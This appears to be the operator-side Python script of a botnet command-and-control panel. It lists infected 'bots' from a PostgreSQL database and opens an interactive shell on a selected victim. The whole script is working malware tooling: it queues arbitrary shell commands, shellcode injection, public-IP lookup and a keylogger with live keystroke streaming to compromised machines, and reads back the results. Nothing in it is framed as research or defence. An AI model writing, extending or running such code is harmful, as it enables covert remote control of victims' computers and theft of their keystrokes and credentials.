#!/usr/bin/python
import psycopg2
import base64
import json
import traceback
import string
import random
import shlex
import subprocess
import argparse
import time
import termios
import fcntl
import sys
import os
from uuid import uuid4
db = psycopg2.connect(dbname='', user='', host='localhost', password='t')
sql = db.cursor()
db.autocommit = True
cmds = []


def _read_single_keypress():
    fd = sys.stdin.fileno()

    flags_save = fcntl.fcntl(fd, fcntl.F_GETFL)
    attrs_save = termios.tcgetattr(fd)

    attrs = list(attrs_save)

    attrs[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK 
                  | termios.ISTRIP | termios.INLCR | termios. IGNCR 
                  | termios.ICRNL | termios.IXON )
    attrs[1] &= ~termios.OPOST
    attrs[2] &= ~(termios.CSIZE | termios. PARENB)
    attrs[2] |= termios.CS8
    attrs[3] &= ~(termios.ECHONL | termios.ECHO | termios.ICANON
                  | termios.ISIG | termios.IEXTEN)
    termios.tcsetattr(fd, termios.TCSANOW, attrs)

    fcntl.fcntl(fd, fcntl.F_SETFL, flags_save & ~os.O_NONBLOCK)

    try:
        ret = sys.stdin.read(1)

    except KeyboardInterrupt: 
        ret = 0

    finally:
        termios.tcsetattr(fd, termios.TCSAFLUSH, attrs_save)
        fcntl.fcntl(fd, fcntl.F_SETFL, flags_save)

    return ret
    

def shell(botid):
    os.system('cls' if os.name == 'nt' else 'clear')
    prompt = '>'
    keylogger_id = None

    while True:
        try:
            command_parser = argparse.ArgumentParser()
            command = raw_input(prompt)
    
            sql.execute("SELECT running FROM bots WHERE botid=%s", (botid,))
            if sql.fetchone()[0] == False:
                print 'Bot no longer running. Press any key to continue.'
                _read_single_keypress()
                break

            if command == '!exit':
                return True
        
            elif command.startswith('!cd'):
                command_parser.add_argument('dir', help='Directory to change to')
                command_parser = command_parser.parse_args(shlex.split(command.encode('string_escape'))[1:])

                cmdid = str(uuid4())
                args = base64.urlsafe_b64encode(json.dumps({'directory': command_parser.dir}))
                sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'cd', %s)", (cmdid, botid, args))
                while True:
                    sql.execute("DELETE FROM cmds WHERE cmdid=%s AND running=False RETURNING prompt", (cmdid,))
                    qret = sql.fetchone()
                    if qret is not None:
                        break
                    time.sleep(1)

                prompt = qret[0]

            elif command.startswith('!shellcode'):
                group = command_parser.add_mutually_exclusive_group(required=True)
                group.add_argument('--string', help='String of shellcode to execute')
                group.add_argument('--file', help='Shellcode file to execute')
                command_parser = command_parser.parse_args(shlex.split(command.encode('string_escape'))[1:])

                if command_parser.string:
                    shellcode = command_parser.string
    
                elif command_parser.file:
                    f = open(command_parser.file, 'rb')
                    shellcode = f.read().decode('string-escape')
                    f.close()
    
                cmdid = str(uuid4())
                args = base64.urlsafe_b64encode(json.dumps({'shellcode': shellcode}))
                sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'shellcodeinject', %s)", (cmdid, botid, args))
                while True:
                    sql.execute("DELETE FROM cmds WHERE cmdid=%s AND running=False RETURNING prompt", (cmdid,))
                    qret = sql.fetchone()
                    if qret is not None:
                        break
                    time.sleep(1)

                prompt = qret[0]
                print 'Shellcode sucessfully executed.'
    
            elif command.startswith('!getip'):
                cmdid = str(uuid4())
                sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'getip', %s)", (cmdid, botid, base64.urlsafe_b64encode('{}')))
    
                while True:
                    sql.execute("DELETE FROM cmds WHERE cmdid=%s AND running=False RETURNING response, prompt", (cmdid,))
                    qret = sql.fetchone()
                    if qret is not None:
                        break
                    time.sleep(1)

                print 'Bot\'s public IP adress is ' + base64.urlsafe_b64decode(qret[0]).decode('string_escape')
                prompt = qret[1]
    
            elif command.startswith('!keylogger'):
                group = command_parser.add_mutually_exclusive_group(required=True)
                group.add_argument('--live', action='store_true', help='Display live keystrokes')
                group.add_argument('--start', action='store_true', help='Start the keylogger')
                group.add_argument('--read', action='store_true', help='Read keystrokes')
                group.add_argument('--stop', action='store_true', help='Stop the keylogger')
                command_parser = command_parser.parse_args(shlex.split(command.encode('string_escape'))[1:])
    
                if command_parser.live:
                    sql.execute("SELECT cmdid FROM cmds WHERE function='keylogger' AND botid=%s AND running=True", (botid,))
                    if not keylogger_id:
                        print 'starting keylogger...'
                        keylogger_id = str(uuid4())
                        sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'keylogger', %s)", (keylogger_id, botid, base64.urlsafe_b64encode('{}')))
    
                    keystrokes = ''
                    while True:
                        try:
                            args = base64.urlsafe_b64encode(json.dumps({'cmdid': keylogger_id}))
                            read_id = str(uuid4())
                            sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'read', %s)", (read_id, botid, args))
                            time.sleep(5)
    
                            while True:  
                                sql.execute("DELETE FROM cmds WHERE cmdid=%s AND running=False RETURNING response, prompt", (read_id,))
                                qret = sql.fetchone()
                                if qret is not None:
                                    break
                                time.sleep(1)

                            keystrokes = base64.urlsafe_b64decode(qret[0]).encode('string_escape')
                            prompt = qret[1]

                            os.system('cls' if os.name == 'nt' else 'clear')
                            print keystrokes
                            print 'Press Ctrl+C to exit...'
                            time.sleep(4)

                        except KeyboardInterrupt:
                            break
    
                elif command_parser.start:
                    if keylogger_id:
                        print 'Keylogger already running.'
                        continue

                    keylogger_id = str(uuid4())
                    sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'keylogger', %s)", (keylogger_id, botid, base64.urlsafe_b64encode('{}')))

                    print 'Keylogger started.'

                elif command_parser.read:
                    if not keylogger_id:
                        print 'Keylogger not running.'
                        continue

                    args = base64.urlsafe_b64encode(json.dumps({'cmdid': keylogger_id}))
                    sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'read', %s)", (keylogger_id, botid, args))

                    while True:  
                        sql.execute("DELETE FROM cmds WHERE cmdid=%s AND running=False RETURNING response, prompt", (keylogger_id,))
                        qret = sql.fetchone()
                        if qret is not None:
                            break
                        time.sleep(1)

                    print 'keystrokes: \n' + base64.urlsafe_b64decode(qret[0]).encode('string_escape')
                    prompt = qret[1]

                elif command_parser.stop:
                    if not keylogger_id:
                        print 'Keylogger not running.'
                        continue
    
                    end_id = str(uuid4())
                    args = base64.urlsafe_b64encode(json.dumps({'cmdid': keylogger_id}))
                    sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'end', %s)", (end_id, botid, args))
                    while True:  
                        sql.execute("DELETE FROM cmds WHERE cmdid=%s AND running=False RETURNING prompt", (end_id,))
                        qret = sql.fetchone()
                        if qret is not None:
                            break
                        time.sleep(1)

                    prompt = qret[0]

                    print 'Keylogger stopped.'

            else:
                cmdid = str(uuid4())
                sql.execute("INSERT INTO cmds (cmdid, botid, function, args) VALUES (%s, %s, 'cmd', %s)", (cmdid, botid, base64.urlsafe_b64encode(json.dumps({'cmd': command}))))
                while True:
                    sql.execute("DELETE FROM cmds WHERE cmdid=%s AND running=False RETURNING response, prompt", (cmdid,))
                    qret = sql.fetchone()
                    if qret is not None:
                        print base64.urlsafe_b64decode(qret[0]).decode('string_escape')
                        break
                    time.sleep(1)

                prompt = qret[1]

        except SystemExit:
            continue
 

def main():
    while True:
        try:
            sql.execute("SELECT botid, ip FROM bots WHERE running=True")
            bots = sql.fetchall()
            lines = []
            lines_max = 0
            for bot in range(len(bots)):
                lines.append('|  ' + str(bot) + '       ' + str(bots[bot][0]) + '      ' + str(bots[bot][1]) + '  |')
                if len(lines[-1]) > lines_max:
                    lines_max = len(lines[-1])

            if len(lines) == 0:
                lines_max = 66

            line0 = '/' + '-'*((lines_max-6)/2) + 'BOTS' + '-'*((lines_max-6)/2) + '\\'
            line1 = '|Index' + ' '*((lines_max-23)/2) + 'Bot ID' + ' '*((lines_max-23)/2) + 'IP Address|'
            if len(line0) < lines_max:
                line0 = line0.replace('\\', '-\\')
            if len(line1) < lines_max:
                line1 = line1.replace('IP Address|', ' IP Address|')
 
            os.system('cls' if os.name == 'nt' else 'clear')
            print line0
            print line1
            for line in lines:
                print line
            print 'Press Ctrl+C to select bot...'
            time.sleep(2)

        except KeyboardInterrupt:
            n = input('Select bot:')
            shell(bots[n][0])
            
            
if __name__ == '__main__':
    try:
        main()

    except:
        traceback.print_exc()

    finally:
        db.commit()
        db.close()
